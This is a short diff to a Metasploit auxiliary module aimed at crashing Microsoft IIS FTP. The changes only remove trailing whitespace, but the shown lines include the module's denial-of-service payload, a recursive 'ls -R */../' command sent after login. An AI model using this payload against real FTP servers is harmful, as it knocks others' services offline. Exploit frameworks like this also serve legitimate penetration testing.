@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
 			'DisclosureDate' => 'Sep 03 2009'))
 	end
 
-	def run	
+	def run
 		#Attempt to crash IIS FTP
 		begin
 			return unless connect_login
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 
-			print_status("Sending DoS packets ...")	
+			print_status("Sending DoS packets ...")
 			res = send_cmd_datax(['ls','-R */../'],' ')
 			disconnect
 		rescue ::Interrupt
